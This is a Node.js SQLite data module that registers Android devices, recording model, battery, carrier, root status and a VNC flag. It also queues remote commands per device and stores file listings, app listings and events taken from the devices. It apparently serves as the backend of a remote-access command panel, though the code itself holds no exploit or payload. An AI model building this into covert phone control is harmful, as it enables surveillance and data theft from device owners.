'use strict';
const Database = require('better-sqlite3');
const path     = require('path');

const db = new Database(path.join(__dirname, '..', 'alpha.db'));
db.pragma('journal_mode = WAL');
db.pragma('foreign_keys = ON');

db.exec(`
  CREATE TABLE IF NOT EXISTS devices (
    id          TEXT PRIMARY KEY,
    model       TEXT,
    sdk         INTEGER,
    screen_w    INTEGER,
    screen_h    INTEGER,
    battery     INTEGER,
    operator    TEXT,
    has_root    INTEGER DEFAULT 0,
    vnc_v1      INTEGER DEFAULT 0,
    last_seen   INTEGER,
    first_seen  INTEGER DEFAULT (strftime('%s','now'))
  );

  CREATE TABLE IF NOT EXISTS cmd_queue (
    id      INTEGER PRIMARY KEY AUTOINCREMENT,
    dev_id  TEXT NOT NULL,
    cmd     TEXT NOT NULL,
    args    TEXT DEFAULT '{}',
    queued  INTEGER DEFAULT (strftime('%s','now'))
  );

  CREATE TABLE IF NOT EXISTS file_listings (
    id      INTEGER PRIMARY KEY AUTOINCREMENT,
    dev_id  TEXT NOT NULL,
    path    TEXT,
    data    TEXT,
    ts      INTEGER DEFAULT (strftime('%s','now'))
  );

  CREATE TABLE IF NOT EXISTS app_listings (
    id      INTEGER PRIMARY KEY AUTOINCREMENT,
    dev_id  TEXT NOT NULL,
    data    TEXT,
    ts      INTEGER DEFAULT (strftime('%s','now'))
  );

  CREATE TABLE IF NOT EXISTS events (
    id      INTEGER PRIMARY KEY AUTOINCREMENT,
    dev_id  TEXT,
    type    TEXT,
    data    TEXT,
    ts      INTEGER DEFAULT (strftime('%s','now'))
  );
`);

const run  = (sql, params = []) => db.prepare(sql).run(...params);
const get  = (sql, params = []) => db.prepare(sql).get(...params);
const all  = (sql, params = []) => db.prepare(sql).all(...params);

// Upsert device on register
function upsertDevice(id, info) {
  run(`
    INSERT INTO devices(id,model,sdk,screen_w,screen_h,battery,operator,has_root,vnc_v1,last_seen)
    VALUES(?,?,?,?,?,?,?,?,?,strftime('%s','now'))
    ON CONFLICT(id) DO UPDATE SET
      model=excluded.model, sdk=excluded.sdk,
      screen_w=excluded.screen_w, screen_h=excluded.screen_h,
      battery=excluded.battery, operator=excluded.operator,
      has_root=excluded.has_root, vnc_v1=excluded.vnc_v1,
      last_seen=strftime('%s','now')
  `, [id, info.model||'', info.sdk||0, info.screenW||0, info.screenH||0,
      info.battery||0, info.operator||'', info.isRoot?1:0, info.vncV1?1:0]);
}

function touchDevice(id) {
  run(`UPDATE devices SET last_seen=strftime('%s','now') WHERE id=?`, [id]);
}

function enqueueCmd(devId, cmd, args = {}) {
  run(`INSERT INTO cmd_queue(dev_id,cmd,args) VALUES(?,?,?)`,
      [devId, cmd, JSON.stringify(args)]);
}

function flushQueue(devId) {
  const rows = all(`SELECT id,cmd,args FROM cmd_queue WHERE dev_id=? ORDER BY id ASC`, [devId]);
  if (rows.length) run(`DELETE FROM cmd_queue WHERE dev_id=?`, [devId]);
  return rows.map(r => ({ cmd: r.cmd, args: JSON.parse(r.args) }));
}

function logEvent(devId, type, data) {
  run(`INSERT INTO events(dev_id,type,data) VALUES(?,?,?)`,
      [devId, type, typeof data === 'string' ? data : JSON.stringify(data)]);
}

module.exports = { db, run, get, all, upsertDevice, touchDevice, enqueueCmd, flushQueue, logEvent };
